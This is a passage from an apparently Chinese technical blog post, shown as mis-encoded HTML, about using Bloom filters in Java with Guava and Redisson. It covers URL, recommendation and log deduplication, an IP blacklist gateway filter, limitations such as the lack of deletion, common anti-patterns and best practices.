            Funnels.stringFunnel(Charsets.UTF_8),
            <span class="hljs-number">100_000_000</span>,  <span class="hljs-comment">// 1äº¿URL</span>
            <span class="hljs-number">0.03</span>          <span class="hljs-comment">// 3%è¯¯åˆ¤ç‡ï¼ˆçˆ¬è™«åœºæ™¯å¯æ¥å—ï¼‰</span>
        );
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isDuplicate</span><span class="hljs-params">(String url)</span> {
        <span class="hljs-keyword">if</span> (urlFilter.mightContain(url)) {
            <span class="hljs-comment">// å¯èƒ½é‡å¤ï¼ŒæŸ¥æ•°æ®åº“ç¡®è®¤</span>
            <span class="hljs-keyword">return</span> urlRepository.exists(url);
        }
        
        <span class="hljs-comment">// ä¸€å®šæ²¡çˆ¬è¿‡</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">markAsCrawled</span><span class="hljs-params">(String url)</span> {
        urlFilter.put(url);
        urlRepository.save(url);
    }
}
</code></pre>
<p><strong>æ•ˆæœï¼š</strong></p>
<ul>
<li>å†…å­˜å ç”¨ä»4GBé™ä½åˆ°360MB</li>
<li>90%çš„é‡å¤URLåœ¨å¸ƒéš†è¿‡æ»¤å™¨é˜¶æ®µå°±è¢«è¯†åˆ«</li>
</ul>
<h3 data-id="heading-26">6.3 å®æ—¶æ¨èå»é‡</h3>
<p><strong>åœºæ™¯æè¿°ï¼š</strong>
ç»™ç”¨æˆ·æ¨èå†…å®¹æ—¶ï¼Œéœ€è¦è¿‡æ»¤æ‰å·²ç»æ¨èè¿‡çš„å†…å®¹ã€‚ç”¨æˆ·çš„å†å²è®°å½•å¯èƒ½æœ‰ä¸Šä¸‡æ¡ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RecommendService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedissonClient redissonClient;
    
    <span class="hljs-keyword">public</span> List&lt;Content&gt; <span class="hljs-title function_">recommend</span><span class="hljs-params">(Long userId)</span> {
        <span class="hljs-comment">// è·å–ç”¨æˆ·çš„å¸ƒéš†è¿‡æ»¤å™¨</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">filterKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"recommend:history:"</span> + userId;
        RBloomFilter&lt;Long&gt; historyFilter = 
            redissonClient.getBloomFilter(filterKey);
        
        <span class="hljs-keyword">if</span> (!historyFilter.isExists()) {
            historyFilter.tryInit(<span class="hljs-number">50_000</span>, <span class="hljs-number">0.01</span>);
            
            <span class="hljs-comment">// åŠ è½½å†å²è®°å½•</span>
            List&lt;Long&gt; history = recommendMapper.getHistory(userId);
            history.forEach(historyFilter::add);
        }
        
        <span class="hljs-comment">// è·å–å€™é€‰å†…å®¹</span>
        List&lt;Content&gt; candidates = getTopCandidates(userId, <span class="hljs-number">100</span>);
        
        <span class="hljs-comment">// è¿‡æ»¤å·²æ¨èçš„</span>
        List&lt;Content&gt; filtered = candidates.stream()
            .filter(c -&gt; !historyFilter.contains(c.getId()))
            .limit(<span class="hljs-number">20</span>)
            .collect(Collectors.toList());
        
        <span class="hljs-comment">// è®°å½•æœ¬æ¬¡æ¨è</span>
        filtered.forEach(c -&gt; historyFilter.add(c.getId()));
        
        <span class="hljs-keyword">return</span> filtered;
    }
}
</code></pre>
<h3 data-id="heading-27">6.4 åˆ†å¸ƒå¼æ—¥å¿—å»é‡</h3>
<p><strong>åœºæ™¯æè¿°ï¼š</strong>
å¾®æœåŠ¡æ¶æ„ä¸‹ï¼ŒåŒä¸€ä¸ªé”™è¯¯å¯èƒ½åœ¨å¤šä¸ªå®ä¾‹ä¸Šå¤§é‡å‡ºç°ã€‚éœ€è¦å¯¹æ—¥å¿—è¿›è¡Œå»é‡ï¼Œé¿å…å‘Šè­¦è½°ç‚¸ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogDeduplicator</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedissonClient redissonClient;
    
    <span class="hljs-keyword">private</span> RBloomFilter&lt;String&gt; logFilter;
    
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        logFilter = redissonClient.getBloomFilter(<span class="hljs-string">"log:dedup"</span>);
        <span class="hljs-keyword">if</span> (!logFilter.isExists()) {
            logFilter.tryInit(<span class="hljs-number">1_000_000</span>, <span class="hljs-number">0.01</span>);
        }
        
        <span class="hljs-comment">// æ¯å°æ—¶é‡ç½®ä¸€æ¬¡</span>
        Executors.newSingleThreadScheduledExecutor()
            .scheduleAtFixedRate(<span class="hljs-built_in">this</span>::resetFilter, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, TimeUnit.HOURS);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">logError</span><span class="hljs-params">(String message, Throwable t)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">logKey</span> <span class="hljs-operator">=</span> message + <span class="hljs-string">":"</span> + t.getStackTrace()[<span class="hljs-number">0</span>].toString();
        
        <span class="hljs-keyword">if</span> (logFilter.contains(logKey)) {
            <span class="hljs-comment">// å·²ç»è®°å½•è¿‡ï¼Œä¸é‡å¤å‘Šè­¦</span>
            <span class="hljs-keyword">return</span>;
        }
        
        logFilter.add(logKey);
        
        <span class="hljs-comment">// å‘é€å‘Šè­¦</span>
        alertService.sendAlert(message, t);
        
        <span class="hljs-comment">// è®°å½•æ—¥å¿—</span>
        log.error(message, t);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resetFilter</span><span class="hljs-params">()</span> {
        logFilter.delete();
        logFilter.tryInit(<span class="hljs-number">1_000_000</span>, <span class="hljs-number">0.01</span>);
    }
}
</code></pre>
<h3 data-id="heading-28">6.5 é»‘åå•å¿«é€Ÿåˆ¤æ–­</h3>
<p><strong>åœºæ™¯æè¿°ï¼š</strong>
APIç½‘å…³éœ€è¦æ‹¦æˆªé»‘åå•IPï¼Œé»‘åå•æœ‰100ä¸‡ä¸ªIPåœ°å€ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IpBlacklistFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedissonClient redissonClient;
    
    <span class="hljs-keyword">private</span> RBloomFilter&lt;String&gt; blacklistFilter;
    
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        blacklistFilter = redissonClient.getBloomFilter(<span class="hljs-string">"ip:blacklist"</span>);
        
        <span class="hljs-keyword">if</span> (!blacklistFilter.isExists()) {
            blacklistFilter.tryInit(<span class="hljs-number">1_000_000</span>, <span class="hljs-number">0.001</span>);  <span class="hljs-comment">// æ›´ä¸¥æ ¼</span>
            
            <span class="hljs-comment">// åŠ è½½é»‘åå•</span>
            List&lt;String&gt; blacklist = blacklistMapper.getAll();
            blacklist.forEach(blacklistFilter::add);
        }
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, 
                        FilterChain chain)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> getClientIp(request);
        
        <span class="hljs-comment">// å¸ƒéš†è¿‡æ»¤å™¨åˆ¤æ–­</span>
        <span class="hljs-keyword">if</span> (blacklistFilter.contains(ip)) {
            <span class="hljs-comment">// å¯èƒ½åœ¨é»‘åå•ï¼Œæ•°æ®åº“ç¡®è®¤</span>
            <span class="hljs-keyword">if</span> (blacklistMapper.exists(ip)) {
                response.sendError(<span class="hljs-number">403</span>, <span class="hljs-string">"IPè¢«å°ç¦"</span>);
                <span class="hljs-keyword">return</span>;
            }
        }
        
        chain.doFilter(request, response);
    }
}
</code></pre>
<h2 data-id="heading-29">ä¸ƒã€ä½¿ç”¨æ³¨æ„äº‹é¡¹</h2>
<h3 data-id="heading-30">7.1 ä¸èƒ½åˆ é™¤å…ƒç´ </h3>
<p>è¿™æ˜¯å¸ƒéš†è¿‡æ»¤å™¨æœ€å¤§çš„é™åˆ¶ã€‚</p>
<p><strong>é—®é¢˜åœºæ™¯ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç”¨æˆ·æ³¨é”€è´¦å·</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteUser</span><span class="hljs-params">(Long userId)</span> {
    userMapper.delete(userId);
    
    <span class="hljs-comment">// æƒ³ä»å¸ƒéš†è¿‡æ»¤å™¨ä¸­åˆ é™¤</span>
    userIdFilter.remove(userId);  <span class="hljs-comment">// æ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼</span>
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆä¸èƒ½åˆ é™¤ï¼Ÿ</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">å‡è®¾ <span class="hljs-string">"user1"</span> å’Œ <span class="hljs-string">"user2"</span> éƒ½æ˜ å°„åˆ°ä½ç½®<span class="hljs-number">3</span>

bit[<span class="hljs-number">3</span>] = <span class="hljs-number">1</span>  (ç”±user1å’Œuser2å…±åŒæ ‡è®°)

åˆ é™¤ user1 æ—¶ï¼ŒæŠŠ bit[<span class="hljs-number">3</span>] è®¾ä¸º<span class="hljs-number">0</span>
é‚£ä¹ˆ user2 ä¹ŸæŸ¥ä¸åˆ°äº†ï¼
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<p>æ–¹æ¡ˆ1ï¼šå®šæœŸé‡å»º</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Scheduled(cron = "0 0 2 * * ?")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rebuild</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// æ¯å¤©å‡Œæ™¨é‡å»ºè¿‡æ»¤å™¨</span>
    rebuildBloomFilter();
}
</code></pre>
<p>æ–¹æ¡ˆ2ï¼šä½¿ç”¨Counting Bloom Filter</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ¯ä¸ªä½ç½®ä¸æ˜¯0/1ï¼Œè€Œæ˜¯è®¡æ•°å™¨</span>
<span class="hljs-type">int</span>[] counters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[size];

<span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(key)</span> {
    counters[hash1(key)]++;
    counters[hash2(key)]++;
}

<span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(key)</span> {
    counters[hash1(key)]--;
    counters[hash2(key)]--;
}
</code></pre>
<p>ç¼ºç‚¹æ˜¯å†…å­˜å ç”¨å¢åŠ 4å€ï¼ˆint vs bitï¼‰ã€‚</p>
<p>æ–¹æ¡ˆ3ï¼šè®¾ç½®è¿‡æœŸæ—¶é—´</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Redisç‰ˆæœ¬ï¼Œè®¾ç½®æ•´ä½“è¿‡æœŸ</span>
RBloomFilter&lt;String&gt; filter = redisson.getBloomFilter(<span class="hljs-string">"key"</span>);
filter.expire(<span class="hljs-number">1</span>, TimeUnit.DAYS);
</code></pre>
<h3 data-id="heading-31">7.2 ä¸èƒ½æ›´æ–°å…ƒç´ </h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é”™è¯¯ç¤ºä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateUser</span><span class="hljs-params">(User user)</span> {
    userMapper.update(user);
    
    <span class="hljs-comment">// æƒ³æ›´æ–°è¿‡æ»¤å™¨</span>
    userIdFilter.remove(oldUserId);  <span class="hljs-comment">// ä¸æ”¯æŒ</span>
    userIdFilter.add(newUserId);
}
</code></pre>
<p>å¸ƒéš†è¿‡æ»¤å™¨åªæ”¯æŒä¸¤ä¸ªæ“ä½œï¼š</p>
<ul>
<li>add(): æ·»åŠ å…ƒç´ </li>
<li>contains(): æŸ¥è¯¢å…ƒç´ </li>
</ul>
<p>æ²¡æœ‰update()å’Œremove()æ–¹æ³•ã€‚</p>
<h3 data-id="heading-32">7.3 åªèƒ½åˆ¤æ–­"ä¸€å®šä¸å­˜åœ¨"</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é”™è¯¯ç†è§£</span>
<span class="hljs-keyword">if</span> (bloomFilter.contains(key)) {
    <span class="hljs-comment">// ä»¥ä¸ºkeyä¸€å®šå­˜åœ¨ â† é”™è¯¯ï¼</span>
    <span class="hljs-keyword">return</span> db.get(key);
}

<span class="hljs-comment">// æ­£ç¡®ç†è§£</span>
<span class="hljs-keyword">if</span> (!bloomFilter.contains(key)) {
    <span class="hljs-comment">// keyä¸€å®šä¸å­˜åœ¨ â† æ­£ç¡®</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}

<span class="hljs-keyword">if</span> (bloomFilter.contains(key)) {
    <span class="hljs-comment">// keyå¯èƒ½å­˜åœ¨ï¼Œéœ€è¦å†ç¡®è®¤</span>
    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> db.get(key);
    <span class="hljs-keyword">return</span> user;
}
</code></pre>
<h3 data-id="heading-33">7.4 é¢„ä¼°å¿…é¡»å‡†ç¡®</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åœºæ™¯ï¼šé¢„ä¼°100ä¸‡ï¼Œå®é™…æ’å…¥1000ä¸‡</span>
BloomFilter&lt;Long&gt; filter = BloomFilter.create(
    Funnels.longFunnel(),
    <span class="hljs-number">1_000_000</span>,  <span class="hljs-comment">// é¢„ä¼°</span>
    <span class="hljs-number">0.01</span>
);

<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10_000_000</span>; i++) {
    filter.put(i);  <span class="hljs-comment">// å®é™…</span>
}

<span class="hljs-comment">// æµ‹è¯•è¯¯åˆ¤ç‡</span>
<span class="hljs-type">int</span> <span class="hljs-variable">falsePositive</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">10_000_000</span>; i &lt; <span class="hljs-number">10_010_000</span>; i++) {
    <span class="hljs-keyword">if</span> (filter.mightContain(i)) {
        falsePositive++;
    }
}

System.out.println(<span class="hljs-string">"è¯¯åˆ¤ç‡: "</span> + falsePositive / <span class="hljs-number">10000.0</span>);
<span class="hljs-comment">// è¾“å‡ºï¼šè¯¯åˆ¤ç‡: 0.35 (35%!)</span>
</code></pre>
<p>å®é™…è¯¯åˆ¤ç‡è¿œè¶…é¢„æœŸçš„1%ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ–¹æ¡ˆ1ï¼šé¢„ä¼°æ—¶ç•™ä½™é‡</span>
<span class="hljs-type">int</span> <span class="hljs-variable">expected</span> <span class="hljs-operator">=</span> currentCount * <span class="hljs-number">2</span>;

<span class="hljs-comment">// æ–¹æ¡ˆ2ï¼šç›‘æ§å¹¶é‡å»º</span>
<span class="hljs-keyword">if</span> (actualCount &gt; expectedCount * <span class="hljs-number">0.8</span>) {
    rebuildWithLargerCapacity();
}

<span class="hljs-comment">// æ–¹æ¡ˆ3ï¼šåˆ†ç‰‡</span>
BloomFilter[] filters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BloomFilter</span>[<span class="hljs-number">10</span>];
<span class="hljs-type">int</span> <span class="hljs-variable">shardIndex</span> <span class="hljs-operator">=</span> userId % <span class="hljs-number">10</span>;
filters[shardIndex].add(userId);
</code></pre>
<h3 data-id="heading-34">7.5 åˆ†å¸ƒå¼åœºæ™¯çš„åŒæ­¥é—®é¢˜</h3>
<p>å•æœºç‰ˆå¸ƒéš†è¿‡æ»¤å™¨åœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸‹å­˜åœ¨æ•°æ®ä¸ä¸€è‡´ã€‚</p>
<pre><code class="hljs language-css" lang="css">å®ä¾‹<span class="hljs-selector-tag">A</span>æ·»åŠ äº†user1
å®ä¾‹<span class="hljs-selector-tag">B</span>ä¸çŸ¥é“
å®ä¾‹<span class="hljs-selector-tag">B</span>æŸ¥è¯¢user1ï¼Œè¿”å›"ä¸å­˜åœ¨"
</code></pre>
<p>å¿…é¡»ä½¿ç”¨Redisç­‰åˆ†å¸ƒå¼å®ç°ã€‚</p>
<h3 data-id="heading-35">7.6 åºåˆ—åŒ–å’ŒæŒä¹…åŒ–</h3>
<p>Guavaçš„å¸ƒéš†è¿‡æ»¤å™¨æ”¯æŒåºåˆ—åŒ–ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åºåˆ—åŒ–åˆ°æ–‡ä»¶</span>
BloomFilter&lt;Long&gt; filter = createFilter();
<span class="hljs-keyword">try</span> (<span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">"bloom.dat"</span>)) {
    filter.writeTo(fos);
}

<span class="hljs-comment">// ä»æ–‡ä»¶è¯»å–</span>
<span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">"bloom.dat"</span>)) {
    BloomFilter&lt;Long&gt; filter = BloomFilter.readFrom(fis, Funnels.longFunnel());
}
</code></pre>
<p>è¿™åœ¨ä»¥ä¸‹åœºæ™¯æœ‰ç”¨ï¼š</p>
<ul>
<li>åº”ç”¨é‡å¯åå¿«é€Ÿæ¢å¤</li>
<li>å®šæœŸå¤‡ä»½</li>
<li>è·¨åº”ç”¨å…±äº«</li>
</ul>
<h3 data-id="heading-36">7.7 æ€§èƒ½è€ƒè™‘</h3>
<p><strong>Hashå‡½æ•°çš„ä¸ªæ•°å½±å“æ€§èƒ½ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è¯¯åˆ¤ç‡0.01ï¼Œéœ€è¦7ä¸ªHash</span>
<span class="hljs-comment">// æ¯æ¬¡æŸ¥è¯¢è¦è®¡ç®—7æ¬¡Hash</span>

<span class="hljs-comment">// è¯¯åˆ¤ç‡0.001ï¼Œéœ€è¦10ä¸ªHash</span>
<span class="hljs-comment">// æ¯æ¬¡æŸ¥è¯¢è¦è®¡ç®—10æ¬¡Hash</span>
</code></pre>
<p>åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œéœ€è¦æƒè¡¡ï¼š</p>
<ul>
<li>æ›´ä½çš„è¯¯åˆ¤ç‡ vs æ›´é«˜çš„CPUæ¶ˆè€—</li>
</ul>
<p><strong>å»ºè®®ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¸¸è§„åœºæ™¯</span>
è¯¯åˆ¤ç‡ = <span class="hljs-number">0.01</span>, Hashæ•° = <span class="hljs-number">7</span>

<span class="hljs-comment">// é«˜å¹¶å‘åœºæ™¯</span>
è¯¯åˆ¤ç‡ = <span class="hljs-number">0.03</span>, Hashæ•° = <span class="hljs-number">5</span>

<span class="hljs-comment">// é«˜ç²¾åº¦åœºæ™¯</span>
è¯¯åˆ¤ç‡ = <span class="hljs-number">0.001</span>, Hashæ•° = <span class="hljs-number">10</span>
</code></pre>
<h3 data-id="heading-37">7.8 å¸¸è§åæ¨¡å¼</h3>
<p>è¿™äº›é”™è¯¯åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ç»å¸¸å‡ºç°ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„ï¼š</p>
<p><strong>åæ¨¡å¼1ï¼šæŠŠå¸ƒéš†è¿‡æ»¤å™¨å½“ç²¾ç¡®é›†åˆç”¨</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é”™è¯¯ï¼šåˆ¤æ–­ç”¨æˆ·æ˜¯å¦åœ¨çº¿</span>
<span class="hljs-keyword">if</span> (onlineUsersFilter.contains(userId)) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"åœ¨çº¿"</span>;  <span class="hljs-comment">// å¯èƒ½è¯¯åˆ¤ï¼</span>
} <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"ç¦»çº¿"</span>;  <span class="hljs-comment">// è¿™ä¸ªæ˜¯å‡†çš„</span>
}

<span class="hljs-comment">// å¸ƒéš†è¿‡æ»¤å™¨åªèƒ½ç¡®å®š"ä¸€å®šä¸åœ¨"ï¼Œä¸èƒ½ç¡®å®š"ä¸€å®šåœ¨"</span>
</code></pre>
<p><strong>åæ¨¡å¼2ï¼šåœ¨é¢‘ç¹å¢åˆ çš„åœºæ™¯ä½¿ç”¨</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é”™è¯¯ï¼šè´­ç‰©è½¦å»é‡</span>
cartFilter.add(productId);      <span class="hljs-comment">// åŠ å…¥è´­ç‰©è½¦</span>
cartFilter.remove(productId);   <span class="hljs-comment">// ä¸æ”¯æŒåˆ é™¤ï¼</span>

<span class="hljs-comment">// è´­ç‰©è½¦è¿™ç§é¢‘ç¹å¢åˆ çš„åœºæ™¯ï¼Œåº”è¯¥ç”¨Redis Set</span>
</code></pre>
<p><strong>åæ¨¡å¼3ï¼šå¿½ç•¥å†·å¯åŠ¨é—®é¢˜</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é”™è¯¯ï¼šæœåŠ¡é‡å¯åè¿‡æ»¤å™¨ä¸ºç©º</span>
<span class="hljs-meta">@PostConstruct</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
    filter = BloomFilter.create(...);
    <span class="hljs-comment">// å¿˜è®°åŠ è½½å†å²æ•°æ®</span>
}

<span class="hljs-comment">// ç»“æœï¼šæœåŠ¡é‡å¯åï¼Œæ‰€æœ‰è¯·æ±‚éƒ½åˆ¤æ–­ä¸º"ä¸å­˜åœ¨"ï¼Œç¬é—´ç©¿é€DB</span>
</code></pre>
<p><strong>åæ¨¡å¼4ï¼šåˆ†å¸ƒå¼ç¯å¢ƒå„è‡ªç»´æŠ¤</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é”™è¯¯ï¼šæ¯ä¸ªå®ä¾‹ç»´æŠ¤æœ¬åœ°è¿‡æ»¤å™¨</span>
<span class="hljs-comment">// å®ä¾‹Aæ·»åŠ äº†user1</span>
bloomFilter.add(<span class="hljs-number">1L</span>);

<span class="hljs-comment">// å®ä¾‹Bä¸çŸ¥é“ï¼Œè¿˜æ˜¯åˆ¤æ–­ä¸å­˜åœ¨</span>
<span class="hljs-comment">// å¯¼è‡´æ•°æ®ä¸ä¸€è‡´</span>
</code></pre>
<p><strong>æ­£ç¡®åšæ³•ï¼šä½¿ç”¨Redisåˆ†å¸ƒå¼ç‰ˆæœ¬ã€‚</strong></p>
<h2 data-id="heading-38">å…«ã€æ€»ç»“</h2>
<h3 data-id="heading-39">8.1 æ ¸å¿ƒè¦ç‚¹</h3>
<ol>
<li><strong>æœ¬è´¨</strong>ï¼šç”¨bitæ•°ç»„ + å¤šä¸ªHashå‡½æ•°ï¼Œå®ç°ç©ºé—´é«˜æ•ˆçš„é›†åˆåˆ¤æ–­</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šå…è®¸ä¸€å®šçš„è¯¯åˆ¤ï¼Œä½†èŠ‚çœå¤§é‡å†…å­˜</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæµ·é‡æ•°æ®å»é‡ã€ç¼“å­˜ç©¿é€é˜²æŠ¤ã€é»‘åå•åˆ¤æ–­</li>
<li><strong>å…³é”®å‚æ•°</strong>ï¼šé¢„æœŸå…ƒç´ æ•°é‡ã€è¯¯åˆ¤ç‡</li>
<li><strong>é™åˆ¶</strong>ï¼šä¸èƒ½åˆ é™¤ã€ä¸èƒ½æ›´æ–°ã€æœ‰è¯¯åˆ¤</li>
</ol>
<h3 data-id="heading-40">8.2 å†³ç­–æ¡†æ¶</h3>
<p><strong>æ˜¯å¦è¯¥ç”¨å¸ƒéš†è¿‡æ»¤å™¨ï¼ŸæŒ‰è¿™ä¸ªæµç¨‹åˆ¤æ–­ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æ•°æ®é‡æ˜¯å¦ â‰¥ ç™¾ä¸‡çº§ï¼Ÿ
   â””â”€ å¦ â†’ ç›´æ¥ç”¨ HashSet
   â””â”€ æ˜¯ â†’ ç»§ç»­

<span class="hljs-bullet">2.</span> èƒ½å¦æ¥å—å°‘é‡è¯¯åˆ¤ï¼ˆ1-3%ï¼‰ï¼Ÿ
   â””â”€ å¦ â†’ è€ƒè™‘ BitMap æˆ– RoaringBitmap
   â””â”€ æ˜¯ â†’ ç»§ç»­

<span class="hljs-bullet">3.</span> ä¸»è¦ç”¨é€”æ˜¯åˆ¤æ–­"ä¸å­˜åœ¨"ï¼Ÿ
   â””â”€ æ˜¯ â†’ å¸ƒéš†è¿‡æ»¤å™¨å¾ˆåˆé€‚
   â””â”€ å¦ â†’ ç»§ç»­

<span class="hljs-bullet">4.</span> æ˜¯å¦éœ€è¦åˆ é™¤æˆ–æ›´æ–°å…ƒç´ ï¼Ÿ
   â””â”€ æ˜¯ â†’ è€ƒè™‘ Cuckoo Filter æˆ–å®šæœŸé‡å»º
   â””â”€ å¦ â†’ å¸ƒéš†è¿‡æ»¤å™¨å®Œç¾åŒ¹é…
</code></pre>
<h3 data-id="heading-41">8.3 ä½¿ç”¨å»ºè®®</h3>
<p><strong>ä»€ä¹ˆæ—¶å€™ç”¨å¸ƒéš†è¿‡æ»¤å™¨ï¼š</strong></p>
<ul>
<li>æ•°æ®é‡å¤§ï¼ˆç™¾ä¸‡çº§ä»¥ä¸Šï¼‰</li>
<li>å…è®¸ä¸€å®šçš„è¯¯åˆ¤</li>
<li>ä¸»è¦ç”¨äºåˆ¤æ–­"ä¸å­˜åœ¨"</li>
<li>å¯¹å†…å­˜æ•æ„Ÿ</li>
</ul>
<p><strong>ä»€ä¹ˆæ—¶å€™ä¸ç”¨ï¼š</strong></p>
<ul>
<li>æ•°æ®é‡å°ï¼ˆç›´æ¥ç”¨HashSetï¼‰</li>
<li>éœ€è¦100%å‡†ç¡®</li>
<li>éœ€è¦åˆ é™¤æˆ–æ›´æ–°å…ƒç´ </li>
<li>éœ€è¦æŒä¹…åŒ–å…¨éƒ¨æ•°æ®</li>
</ul>
<h3 data-id="heading-42">8.4 æœ€ä½³å®è·µ</h3>
<ol>
<li><strong>é¢„ä¼°å‡†ç¡®</strong>ï¼šé¢„æœŸæ•°é‡ Ã— 1.5å€</li>
<li><strong>å®šæœŸé‡å»º</strong>ï¼šé¿å…è¯¯åˆ¤ç‡ä¸Šå‡</li>
<li><strong>ç›‘æ§æŒ‡æ ‡</strong>ï¼šå®é™…æ•°é‡ã€è¯¯åˆ¤ç‡ã€å†…å­˜å ç”¨</li>
<li><strong>åˆ†å¸ƒå¼ç”¨Redis</strong>ï¼šé¿å…æ•°æ®ä¸ä¸€è‡´</li>
<li><strong>é™çº§æ–¹æ¡ˆ</strong>ï¼šè¿‡æ»¤å™¨å¤±æ•ˆæ—¶çš„å…œåº•ç­–ç•¥</li>
</ol>
<h3 data-id="heading-43">8.5 è¿›é˜¶æ–¹å‘</h3>
<p>å¦‚æœè¿™äº›åŸºç¡€çš„å¸ƒéš†è¿‡æ»¤å™¨ä¸èƒ½æ»¡è¶³éœ€æ±‚ï¼Œå¯ä»¥ç ”ç©¶ï¼š</p>
<ul>
<li>Counting Bloom Filterï¼ˆæ”¯æŒåˆ é™¤ï¼‰</li>
<li>Scalable Bloom Filterï¼ˆåŠ¨æ€æ‰©å®¹ï¼‰</li>
<li>Cuckoo Filterï¼ˆæ›´ä½è¯¯åˆ¤ç‡ï¼Œæ”¯æŒåˆ é™¤ï¼‰</li>
</ul>
<p>ä½†å¯¹äºå¤§éƒ¨åˆ†ä¸šåŠ¡åœºæ™¯ï¼ŒGuavaçš„åŸºç¡€å®ç°å·²ç»è¶³å¤Ÿäº†ã€‚</p>
<hr/>
